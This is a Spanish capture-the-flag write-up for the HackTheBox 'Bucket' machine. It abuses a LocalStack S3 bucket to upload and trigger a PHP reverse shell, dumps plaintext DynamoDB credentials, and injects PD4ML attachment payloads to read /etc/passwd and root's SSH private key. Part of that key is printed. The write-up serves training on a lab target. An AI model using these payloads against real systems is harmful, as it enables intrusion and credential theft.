@@ -1,0 +1,783 @@
+---
+layout      : post
+title       : "HackTheBox - Bucket"
+author      : lanz
+image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png
+category    : [ htb ]
+tags        : [ AWS, PD4ML, ssh-keys, API ]
+---
+Máquina Linux nivel medio, jugaremos mucho con **AWS**, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta **PD4ML** y **AWS DynamoDB**.
+
+![283bucketHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bucketHTB.png)
+
+### TL;DR (Spanish writeup)
+
+**Creada por**: [MrR3boot](https://www.hackthebox.eu/profile/13531).
+
+Bueno bueno, nos estrellaremos contra el servicio `AWS S3`, que nos permite (entre otras cosas) mediante **buckets** almacenar información en las nubes :P Tendremos que jugar con su `API` para obtener información de como subir un archivo al `bucket`... Después de muchas vueltas lograremos subir un archivo que nos permite obtener una reverse Shell, siendo rápidos lograremos la sesión como el usuario `www-data`.
+
+En la enumeración previa, obtuvimos otro servicio corriendo mediante `AWS`, en este caso el motor de base de datos NoSQL `DynamoDB`. Jugando también con la `API` obtendremos la base de datos `users` y varias credenciales... Estando dentro de la máquina veremos al usuario `roy`, usando las credenciales encontradas lograremos migrarnos a su sesión.
+
+Finalmente nos encontraremos un archivo `index.php` algo curioso, nos fijaremos en su cabecera y tendremos un proceso que involucra `DynamoDB` y `PD4ML` (básicamente convierte un archivo en otro con formato `.PDF`). En el código llama una tabla (que no existe) y guarda su data en un objeto que posteriormente lo convierte en `PDF`. Todo esto ejecutado como usuario administrador del sistema (root). Así que aprovecharemos esta locura para obtener la llave privada (id_rsa) del usuario `root` e ingresar a la máquina.
+
+#### Clasificación de la máquina
+
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>
+
+Jmmm, no son vulnerabilidades conocidas, pero pueden llegar a ser reales, pero claro, debemos mover algunas tuercas para que funcione.
+
+> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.
+
+...
+
+**Fases** 🙄
+
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
+3. [Escalada de privilegios](#escalada-de-privilegios)
+
+...
+
+## Enumeración [#](#enumeracion) {#enumeracion}
+
+Empezamos realizando un escaneo de puertos sobre la máquina para conocer que servicios esta corriendo.
+
+```bash
+–» nmap -p- --open -v 10.10.10.212 -oG initScan
+```
+
+| Parámetro  | Descripción |
+| ---------- | :---------- |
+| -p-        | Escanea todos los 65535                                                                                  |
+| --open     | Solo los puertos que están abiertos                                                                      |
+| -v         | Permite ver en consola lo que va encontrando                                                             |
+| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
+
+```bash
+–» cat initScan 
+# Nmap 7.80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.212
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.212 ()   Status: Up
+Host: 10.10.10.212 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 95.68 seconds
+```
+
+Muy bien, ¿que tenemos?
+
+| Puerto | Descripción |
+| :----- | :---------- |
+| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexion remota segura mediante una shell. |
+| 80     | **[HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Overview)**: Comunicación que permite las transferencias de información a través de archivos en internet. |
+
+Realizemos un escaneo en base a scripts y versiones sobre cada puerto, con ello obtenemos informacion mas detallada de cada servicio:
+
+```bash
+–» nmap -p 22,80 -sC -sV 10.10.10.212 -oN portScan
+```
+
+| Parámetro | Descripción |
+| --------- | :---------- |
+| -p        | Escaneo de los puertos obtenidos                       |
+| -sC       | Muestra todos los scripts relacionados con el servicio |
+| -sV       | Nos permite ver la versión del servicio                |
+| -oN       | Guarda el output en un archivo                         |
+
+```bash
+–» cat portScan 
+# Nmap 7.80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.212
+Nmap scan report for 10.10.10.212
+Host is up (0.19s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 22.35 seconds
+```
+
+Tenemos:
+
+| Puerto | Servicio | Versión |
+| :----- | :------- | :-------|
+| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4 |
+| 80     | HTTP     | Apache httpd 2.4.41    |
+
+...
+
+### Puerto 80 [⌖](#puerto-80) {#puerto-80}
+
+Añadimos el dominio `bucket.htb` a nuestro `/etc/hosts`. Por dos razones, en el reporte de `nmap` intenta hacer un redireccionamiento hacia ese dominio y si colocamos la IP en la web nos da error :P
+
+> Sobre el archivo `/etc/hosts`, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.
+
+* [Data sobre el archivo `/etc/hosts`](http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html).
+
+```bash
+–» cat /etc/hosts
+...
+10.10.10.212  bucket.htb
+...
+```
+
+Tenemos:
+
+![283page_bucketHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_bucketHTB.png)
+
+Nada en que fijarnos, revisando el código fuente obtenemos otro dominio:
+
+![283page_bucketHTB_sourcecode](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_bucketHTB_sourcecode.png)
+
+* `s3.bucket.htb`, agreguémoslo también al `/etc/hosts`.
+
+```bash
+–» cat /etc/hosts
+...
+10.10.10.212  bucket.htb s3.bucket.htb
+...
+```
+
+![283page_s3bucketHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB.png)
+
+Lo único que obtenemos es eso. Por lo que entiendo (según la ruta que vimos en el código fuente: `s3.bucket.htb/adserver`) estamos viendo el estado de un servidor de Ads (publicidad o anuncios). Por ahora no tenemos más, intentemos hacer fuzzing sobre las dos webs a ver si encontramos algo (:
+
+El dominio `s3.bucket.htb` nos da la siguiente respuesta:
+
+```bash
+–» dirsearch.py -u http://s3.bucket.htb/ -q
+200 -    2B  - http://s3.bucket.htb/%2e%2e;/test
+200 -    2B  - http://s3.bucket.htb/+CSCOE+/logon.html#form_title_text
+200 -    2B  - http://s3.bucket.htb/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+200 -    2B  - http://s3.bucket.htb/+CSCOE+/session_password.html
+200 -    2B  - http://s3.bucket.htb/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+200 -   54B  - http://s3.bucket.htb/health
+500 -  290B  - http://s3.bucket.htb/latest/meta-data/hostname
+403 -  278B  - http://s3.bucket.htb/server-status
+200 -    0B  - http://s3.bucket.htb/shell
+500 -  158B  - http://s3.bucket.htb/shell.php
+500 -  158B  - http://s3.bucket.htb/shell.aspx
+500 -  158B  - http://s3.bucket.htb/shell.html
+500 -  158B  - http://s3.bucket.htb/shell.jsp
+500 -  158B  - http://s3.bucket.htb/shell.js
+500 -  158B  - http://s3.bucket.htb/shell.sh
+500 -  158B  - http://s3.bucket.htb/shellz.php
+500 -  158B  - http://s3.bucket.htb/shell.asp
+500 -  158B  - http://s3.bucket.htb/shell.htm
+```
+
+Si revisamos `shell`, nos redirecciona a lo que parece ser un contenedor:
+
+```html
+http://s3.bucket.htb/shell -> (redirecciona a) -> http://444af250749d:4566/shell/
+```
+
+Los demás no nos muestran nada relevante... 
+
+La curiosidad me llevo a buscar `s3` en la web, la respuesta: `Amazon S3`. Resumiendo: Almacenamiento de datos seguros en la web mediante `Buckets` <<nombre de la máquina (?)>>.
+
+> Amazon S3 es un servicio ampliamente usado por compañias para guardar mediante `buckets` imagenes, estadisticas, recursos y cualquier objeto que pueda ayudar o necesitar la parte logica del negocio.
+
+* Más info [acá](https://aws.amazon.com/es/s3/) y [acá](https://docs.aws.amazon.com/es_es/AmazonS3/latest/dev/Welcome.html) :P
+
+...
+
+## Explotación [#](#explotacion) {#explotacion}
+
+Listos, leyendo sabemos que podemos subir archivos al `bucket`, siguiendo la [guía oficial](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html) logramos instalar `aws cli`, nos apoyaremos de él para jugar con todo el entorno.
+
+Sabemos que podemos subir, borrar, actualizar y borrar objetos sobre el `bucket`. Por ejemplo para listar los objetos del `bucket` haríamos algo así:
+
+* S3 Bucket Misconfigured Access Controls - [Medium.com/BugBountyWriteup](https://medium.com/bugbountywriteup/s3-bucket-misconfigured-access-controls-to-critical-vulnerability-6b535e3df9a5).
+
+```bash
+–» aws s3 ls s3://s3.bucket.htb/
+```
+
+(Nos pide que agreguemos unas credenciales válidas :P, busque pero no encontré, así que puse cualquiera :P)
+
+Pero si recordamos la URL con la que llegamos acá fue `http://s3.bucket.htb/adserver/images/` y ya sabiendo que estamos manejando `buckets`, lo más seguro es que `adserver` sea uno de ellos.
+
+```bash
+–» aws s3 ls s3://s3.bucket.htb/adserver/images/
+
+An error occurred (InvalidAccessKeyId) when calling the ListObjectsV2 operation: The AWS Access Key Id you provided does not exist in our records.
+```
+
+El tema es que obtenemos un error con respecto al `AccessKeyId` ): Acá estuve full perdido, buscando y buscando, al límite del desespero :P pero sin resignarme encontré mi salvación:
+
+* Working with localstack CLI - [lobster1234/github.io](https://lobster1234.github.io/2017/04/05/working-with-localstack-command-line/).
+
+```bash
+–» aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver/images/
+2020-12-25 19:24:04      37840 bug.jpg
+2020-12-25 19:24:04      51485 cloud.png
+2020-12-25 19:24:04      16486 malware.png
+```
+
+Perfectoooooooooooooooooooooooo, intentemos subir un archivo:
+
+```bash
+–» cat upupup.txt 
+hola padreeeeeeeeeeeeeeee!!
+· ~/sec/htb/bucket/content ·
+–» aws --endpoint-url=http://s3.bucket.htb s3 cp upupup.txt s3://adserver/images/
+upload: ./upupup.txt to s3://adserver/images/upupup.txt          
+· ~/sec/htb/bucket/content ·
+–» aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver/images/
+2020-12-25 19:30:03      37840 bug.jpg
+2020-12-25 19:30:03      51485 cloud.png
+2020-12-25 19:30:03      16486 malware.png
+2020-12-25 19:31:01         28 upupup.txt
+```
+
+![283page_s3bucketHTB_upupup](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB_upupup.png)
+
+Listos, el tema es que hay un limpiado de archivos super agresivo, lo cual nos da poco tiempo para revisar todo... Intentando subir una reverse Shell o webshell no obtuve éxito, lo único que me da respuesta es usar `JavaScript`, pero tampoco logre hacer mucho (o pues nada hasta el momento 😒).
+
+Retrocediendo un poco sobre la ruta `/health` nos dice que tenemos `s3` y `dynamodb` corriendo (va tomando sentido lo que vamos encontrando):
+
+![283page_s3bucketHTB_health](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB_health.png)
+
+Si leemos la documentación de `aws` también tiene la opción de usar `dynamodb`, que nos permite crear tablas, listar las actuales, agregar ítems, entre otras cosas.
+
+* CLI Services DynamoDB - [docs.aws/userguide](https://docs.aws.amazon.com/es_es/cli/latest/userguide/cli-services-dynamodb.html).
+* CLI dynamodb - [docs.aws/reference](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html).
+
+> `DynamoDB` es una base de datos no relacional que ofrece rendimiento en milisegundos, es ofrecido por Amazon Web Services... [freecodecamp.org/basics-dynamodb](https://www.freecodecamp.org/news/ultimate-dynamodb-2020-cheatsheet/#the-basics-of-dynamodb)
+
+Probemos a listar las tablas que existan:
+
+```bash
+–» aws --endpoint-url=http://s3.bucket.htb dynamodb list-tables
+TABLENAMES      Image
+TABLENAMES      ImageTag
+TABLENAMES      users
+```
+
+Okaaaaaa, claramente nos llama la atención la tabla `users`, usando el [parámetro `scan`](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/scan.html) podemos ver su contenido:
+
+```bash
+–» aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name users
+None    3       3
+PASSWORD        Management@#1@#
+USERNAME        Mgmt
+PASSWORD        Welcome123!
+USERNAME        Cloudadm
+PASSWORD        n2vM-<_K_Q:.Aa2
+USERNAME        Sysadm
+```
+
+Obtenemos unas credenciales, probablemente para migrar de usuarios estando dentro de la maquina. Por ahora los guardamos:
+
+| Username | Password |
+| :------- | :------- |
+| Mgmt     | Management@#1@# |
+| Cloudadm | Welcome123!     |
+| Sysadm   | n2vM-<_K_Q:.Aa2 |
+
+Acá (como casi siempre) estuve full perdido ): Ya que nuestro objetivo inicial es subir un archivo que nos genere una reverse Shell, pero no entendía como debía ser el proceso, así que preferí buscar ayuda. [@TazWake](https://www.hackthebox.eu/profile/49335) me redirecciono y a la vez me enseño a pensar fuera de la caja (como le dice la gente):
+
+El tema es que la subida del archivo está perfecto, en nuestro caso subiremos el famoso [reverse Shell de monkeypentest](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) para que apenas lo ejecutemos obtengamos la Shell. Peeeeero acá es donde toca "testear" o "pensar fuera de la caja", ya que si tenemos un servidor principal (`http://bucket.htb/`) y otro donde está el bucket (`http://s3.bucket.htb/adserver/`) podríamos probar a subir el archivo y revisar el servidor por si también de alguna forma se está guardando por ahí.
+
+Así que si inicialmente subimos el archivo `ejejerev.php`, ya con nuestra IP y PUERTO modificado:
+
+```bash
+–» aws --endpoint-url=http://s3.bucket.htb s3 cp ejejerev.php s3://adserver/images/
+upload: ./ejejerev.php to s3://adserver/images/ejejerev.php
+```
+
+Nos ponemos en escucha, en mi caso por el puerto `4433`:
+
+```bash
+–» nc -nlvp 4433
+listening on [any] 4433 ...
+```
+
+Probamos desde consola hacer una petición hacia el archivo:
+
+```bash
+–» curl -s http://s3.bucket.htb/adserver/images/ejejerev.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+...
+```
+
+Claramente no es ejecutado... Pero ¿Y si probamos con el servidor principal?
+
+```bash
+–» curl -s http://bucket.htb/adserver/images/ejejerev.php
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80</address>
+</body></html>
+```
+
+Y con solo la carpeta `/images/`?
+
+```bash
+–» curl -s http://bucket.htb/images/ejejerev.php
+```
+
+![283bash_bucketHTB_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_bucketHTB_revsh.png)
+
+Opa, intentamos un par de veces yyyyyyyy va pa i, obtenemos la Shell. Lección aprendida, probar cosas que parezcan extrañas. Entiendo que de alguna manera (quizás en algún documento que no encontré se explica o se menciona "") temporalmente el servidor principal recoge lo que se está subiendo en el bucket para procesarlo o para... Jmm, no sabría para qué realmente ):
+
+Lo mejor es hacer un script para evitar que se nos borren los archivos y no alcanzar a ejecutarlos (lo más probable es que debamos ejecutarlo más de 1 vez):
+
+```bash
+#!/bin/bash
+
+file_to_up=$1
+
+echo -e "\n[+] Uploading $file_to_up\n"
+aws --endpoint-url=http://s3.bucket.htb/ s3 cp $file_to_up s3://adserver/images/
+
+echo -e "\n[+] Executing reverse shell.\n"
+sleep 3
+
+for i in {1..10}; do
+  curl -s -m 2 http://bucket.htb/images/$file_to_up > /dev/null
+  sleep 1
+done
+```
+
+Bueno bueno, hagamos un [tratamiento de la TTY](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689) apoyandonos de `S4vitar`.
+
+```bash
+www-data@bucket:/$ ls /home/
+roy
+www-data@bucket:/$ cat /home/roy/user.txt 
+cat: /home/roy/user.txt: Permission denied
+www-data@bucket:/$ 
+```
+
+Probemos migrarnos a `roy` con las contraseñas que encontramos anteriormente:
+
+* Con la contraseña de: `Sysadm - n2vM-<_K_Q:.Aa2`.
+
+![283bash_bHTB_revsh_su_roy](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_bHTB_revsh_su_roy.png)
+
+...
+
+## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}
+
+Ahora si a enumerar.
+
+```bash
+roy@bucket:~$ netstat -l
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:33447         0.0.0.0:*               LISTEN
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:4566          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+...
+```
+
+Haciendo `Port Forwarding` encontramos algo interesante en el puerto `8000`:
+
+```bash
+roy@bucket:~$ ssh -R 8000:localhost:8000 root@10.10.14.218
+```
+
+![283page_RPF_8000](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_RPF_8000.png)
+
+Si enumeramos, encontramos el codigo fuente de esa pagina:
+
+```bash
+roy@bucket:~$ cd
+roy@bucket:~$ cd /var/www/bucket-app/
+roy@bucket:/var/www/bucket-app$ ls -la 
+total 856
+drwxr-x---+  4 root root   4096 Sep 23 10:56 .
+drwxr-xr-x   4 root root   4096 Sep 21 12:28 ..
+-rw-r-x---+  1 root root     63 Sep 23 02:23 composer.json
+-rw-r-x---+  1 root root  20533 Sep 23 02:23 composer.lock
+drwxr-x---+  2 root root   4096 Jan  4 08:00 files
+-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php
+-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
+drwxr-x---+ 10 root root   4096 Sep 23 02:23 vendor
+roy@bucket:/var/www/bucket-app$ cat index.php | grep -i site -A 5
+    <h1 class="advice__title">Site under construction or maintenance </h1>
+    <p class="advice__description"><span><</span> Bucket Application <span>/></span> not finished yet</p>
+  </section>
+  <section class="city-stuff">
+    <ul class="skyscrappers__list">
+      <li class="skyscrapper__item skyscrapper-1"></li>
+roy@bucket:/var/www/bucket-app$ 
+```
+
+Tenemos la estructura de la pagina y además que su propietario es el usuario `root`. Revisando el archivo `index.php` tenemos en su cabecera:
+
+```php
+roy@bucket:/var/www/bucket-app$ cat index.php | head -n 29
+<?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+        if($_POST["action"]==="get_alerts") {
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' => 'default',
+                        'region'  => 'us-east-1',
+                        'version' => 'latest',
+                        'endpoint' => 'http://localhost:4566'
+                ]);
+
+                $iterator = $client->getIterator('Scan', array(
+                        'TableName' => 'alerts',
+                        'FilterExpression' => "title = :title",
+                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+                ));
+
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item["data"]);
+                }
+                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+        }
+}
+else
+{
+?>
+```
+
+Algo medio extraño... Veamos de que se trata:
+
+1. Si la petición que llega es un método `POST` y el atributo `action` es igual a `get_alerts`,
+2. Crea un objeto mediante `DynamoDbClient` con 4 argumentos,
+3. Para después hacer un `scan` (para ver el contenido de una tabla) a la tabla `alerts`, filtrando por el título `Ransomware`,
+4. Posteriormente genera un nombre **random**`.html`, extrae la data que obtuvo de la tabla y la guarda en el archivo `files/`**random**`.html`,
+5. Ahora con [`PD4ML`](https://pd4ml.com/index.htm) genera un archivo **.PDF** tomando el archivo generado anteriormente, que está guardado en: `/var/www/bucket-app/files/$name` y guarda el resultado en la ruta `files/result.pdf`.
+
+> `PD4ML` es una herramienta generadora de archivos PDF que usa HTML y CSS para obtener el formato.
+
+De lo anterior podemos deducir que `PD4ML` al estar guardando una ruta absoluta, podemos pasarle la ruta del archivo `root.txt` o incluso la de la llave `SSH privada` del usuario **root** para después de leer el `.PDF` ingresar a la máquina con ella.
+
+...
+
+Bueno, pues si revisamos las tablas que existen mediante `aws dynamodb` tenemos:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+{
+    "TableNames": [
+        "users"
+    ]
+}
+roy@bucket:/var/www/bucket-app$ 
+```
+
+Procedamos a crear la tabla `alerts` agregando el título `Ransomware`:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \
+--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
+--key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
+--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
+```
+
+Más info sobre creación y tablas:
+
+* Crear una tabla - [docs.aws/developerguide](https://docs.aws.amazon.com/es_es/amazondynamodb/latest/developerguide/getting-started-step-1.html).
+* Create a simple table in aws dynamodb - [Medium.com/jerrythimothy](https://medium.com/@jerrythimothy/create-a-simple-table-in-aws-dynamodb-gui-cli-2b7a917a688b).
+* Create table - [docs.aws/reference](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html).
+* Basic operations with tables, dynamodb - [docs.amazonaws/developerguide](https://docs.amazonaws.cn/en_us/amazondynamodb/latest/developerguide/WorkingWithTables.Basics.html).
+* Dynamodb CLI query examples - [dynobase.dev](https://dynobase.dev/dynamodb-cli-query-examples/).
+
+La respuesta de la ejecución es la siguiente:
+
+```json
+{
+    "TableDescription": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "title",
+                "AttributeType": "S"
+            },
+            {
+                "AttributeName": "data",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "alerts",
+        "KeySchema": [
+            {
+                "AttributeName": "title",
+                "KeyType": "HASH"
+            },
+            {
+                "AttributeName": "data",
+                "KeyType": "RANGE"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": 1609778713.466,
+        "ProvisionedThroughput": {
+            "LastIncreaseDateTime": 0.0,
+            "LastDecreaseDateTime": 0.0,
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 10,
+            "WriteCapacityUnits": 5
+        },
+        "TableSizeBytes": 0,
+        "ItemCount": 0,
+        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
+    }
+}
+```
+
+Validamos:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+{
+    "TableNames": [
+        "alerts",
+        "users"
+    ]
+}
+```
+
+Y el contenido:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+{
+    "Items": [],
+    "Count": 0,
+    "ScannedCount": 0,
+    "ConsumedCapacity": null
+}
+```
+
+La tabla es borrada en pocos segundos, así que debemos trabajar rápido...
+
+Agregamos data dentro de la tabla:
+
+* Using bash and aws CLI to interact with tables - [blog.ruanbekker.com](https://blog.ruanbekker.com/blog/2018/08/14/tutorial-on-dynamodb-using-bash-and-the-aws-cli-tools-to-interact-with-a-music-dataset/).
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+--item '{"Title": {"S": "Ransomware"}, "data": {"S": "/etc/passwd"}}'
+```
+
+```json
+{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+
+```
+
+Validamos el contenido ahora:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+```
+
+```json
+{
+    "Items": [
+        {
+            "title": {
+                "S": "Ransomware"
+            },
+            "data": {
+                "S": "/etc/passwd"
+            }
+        }
+    ],
+    "Count": 1,
+    "ScannedCount": 1,
+    "ConsumedCapacity": null
+}
+```
+
+Ahora nos quedaria realizar la petición `cURL` con el metodo `POST` y el atributo `action`:
+
+```bash
+roy@bucket:/var/www/bucket-app$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+```
+
+Obtenemos el archivo `result.pdf`:
+
+```bash
+roy@bucket:/var/www/bucket-app$ cd files
+roy@bucket:/var/www/bucket-app/files$ ls -la
+total 12
+drwxr-x---+ 2 root root 4096 Jan  5 02:23 .
+drwxr-x---+ 4 root root 4096 Sep 23 10:56 ..
+-rw-r--r--  1 root root 1633 Jan  5 02:23 result.pdf
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf
+%PDF-1.4
+%
+1 0 obj
+% [24]
+<<
+/Filter /FlateDecode
+...
+```
+
+Pero entre toda la data no vemos nada relacionado con el archivo `/etc/passwd`. Acá estuve un buen tiempo atascado, así que recurrí de nuevo a [@TazWake](https://www.hackthebox.eu/profile/49335) que me dio una mano con una página donde indica que `PD4ML` soporta archivos adjuntos mediante el tag: `<pd4ml:attachment>`, lo que nos permite adjuntar un archivo para ver o listar el contenido del mismo :P
+
+* PDF Attachments - [pd4ml.com](https://pd4ml.com/cookbook/pdf-attachments.htm).
+
+Lo curioso fue que después de un rato de jugar con esto encontré un tweet donde se hablaba de este descubrimiento y como explotarlo:
+
+* Playing with PD4ML API - [twitter.com/akhilreni_hs](https://twitter.com/akhilreni_hs/status/1219633535897817088).
+
+```json
+<pd4ml:attachment description="attached.txt" icon="PushPin">file:///etc/passwd</pd4ml:attachment>
+```
+
+Listo, pues intentemos agregar esta línea a la fila `data` de nuestra tabla y ejecutamos la petición con `cURL` a ver que sucede:
+
+```bash
+roy@bucket:/var/www/bucket-app$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+        --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///etc/passwd</pd4ml:attachment>"}}'
+```
+
+Escapamos las `""` (comillas) y le damos:
+
+```bash
+roy@bucket:/var/www/bucket-app/files$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf
+%PDF-1.4
+%
+1 0 obj
+% [24] 
+<<
+/Filter /FlateDecode
+...
+...
+/Params 5 0 R
+>>
+stream
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+...
+```
+
+Perfectooooooooooooooooooo, tenemos la estructura del archivo `/etc/passwd` en nuestro resultado. Probemos a ver si el usuario `root` tiene llave privada en su `$HOME`:
+
+```json
+<pd4ml:attachment description="attached.txt" icon="PushPin">file:///root/.ssh/id_rsa</pd4ml:attachment>
+```
+
+```bash
+roy@bucket:/var/www/bucket-app/files$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+>         --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>
+"}}'
+{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+```
+
+```bash
+roy@bucket:/var/www/bucket-app/files$ curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+roy@bucket:/var/www/bucket-app/files$ cat result.pdf 
+%PDF-1.4
+%
+1 0 obj
+% [24] 
+<<
+/Filter /FlateDecode
+/Length 397
+>>
+stream
+...
+/Length 2602
+/Params 5 0 R
+>>
+stream
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU
+bQr/unofKrmgNMAhjmrHCiMapmDw1dcyj4PSPtwo6IvrV0Guyu34Law1Eav9sV1hgzDLm8
+9tAB7fh2JN8OB/4dt0sWxHxzWfCmHF5DBWSlxdk+K4H2vJ+eTA2FxT2teLPmJd7G9mvanh
